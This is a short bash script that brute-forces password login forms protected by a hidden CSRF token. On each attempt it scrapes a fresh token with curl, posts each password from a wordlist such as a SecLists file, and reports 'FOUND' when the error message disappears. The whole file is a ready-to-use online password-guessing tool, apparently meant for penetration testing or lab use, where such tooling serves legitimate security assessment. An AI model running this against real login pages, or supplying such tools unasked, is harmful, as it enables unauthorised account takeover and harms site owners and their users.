#!/bin/bash
#
# Tests forms with CSRF token
#

# Example
#formpage="http://mypage.com/login/index.php"
#token_tag="token"
#passwd_tag="pass"
#otherdata="user=admin&submit=Send"
#filename="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"
#error_msg="Incorrect user or password" 

# Usage

if [ -z "${6}" ]
then
	echo "Usage: $0 form_page token_name passsword_name other_post_data wordlist error_message"
	echo ""
	echo "Parameters:"
	echo "	form_page 	: HTTP POST form web page"
	echo "	token_name 	: Name of the hidden form input with the the CSRF token as value"
	echo "			Example: token_name is 'mytoken' in the following form input:"
	echo "			<input type=\"hidden\" name=\"mytoken\" value=\"437cf6a86b75d968d2896b\" />"
	echo "	passsword_name 	: Name of the password form input"
	echo "	other_post_data : Other data to be sent in the form POST request"
	echo "	wordlist 	: Wordlist to be used as password in the brute force attack"
	echo "	error_message 	: Error message to identify that the password input was not correct"
	echo ""
	echo "Example:"
	echo "	$0 http://mypage.com/login/index.php token pass 'user=admin&submit=Send' '/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt' 'Incorrect user or password'"
	exit
fi

formpage="$1"
token_tag="$2"
passwd_tag="$3"
otherdata="$4"
filename="$5"
error_msg="$6"

while read line
do
	passwd=$line

	# Change this line to get token
	token=$(curl -s -c cookies.txt "${formpage}" | grep hidden | grep "${token_tag}" | grep -Pio 'value="\K[^"]*')

	output=$(curl -s -b cookies.txt "${formpage}" --data-raw "${passwd_tag}=${passwd}&${token_tag}=${token}&${otherdata}")

	if [[ "$output" =~ "$error_msg" ]]
	then
		echo -n "."
	else
		echo ""
		echo ">>> FOUND!! $passwd"
		exit
	fi

done < $filename

rm cookies.txt
